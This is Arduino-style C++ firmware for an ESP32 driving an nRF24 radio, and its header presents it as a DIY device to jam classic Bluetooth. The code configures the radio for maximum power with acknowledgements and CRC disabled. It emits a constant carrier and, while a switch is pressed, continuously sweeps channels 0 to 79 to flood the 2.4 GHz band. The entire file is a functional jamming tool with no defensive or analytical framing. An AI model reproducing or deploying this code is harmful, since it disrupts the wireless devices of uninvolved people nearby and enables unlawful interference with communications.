/*
 * nrfBlueNullifier
 * DIY project to jam classic bluetooth signals.
 * Author - WireBits
 */

#include <RF24.h>
#include <esp_bt.h>

const int switchPin = 12;
SPIClass *sp = nullptr;
RF24 radio(22, 21, 19909090);
byte i = 45;
unsigned int flag = 0;

void nrfSPIInit() {
 sp = new SPIClass(VSPI);
 sp->begin();
 if (radio.begin(sp)) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPayloadSize(31);
  radio.setAddressWidth(4);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();
  radio.startConstCarrier(RF24_PA_MAX, i);
 }
}

void adjustAndSweepChannels() {
 flag = (i > 79) ? 1 : ((i < 2) ? 0 : flag);
 i += (flag == 0) ? 2 : -2;
 radio.setChannel(i);
 for (int j = 0; j <= 79; j++) radio.setChannel(j);
}

void setup(){
 pinMode(switchPin, INPUT_PULLUP);
 esp_bt_controller_deinit();
 nrfSPIInit();
}

void loop(){
 if (digitalRead(switchPin) == LOW){
  adjustAndSweepChannels();
 }
}
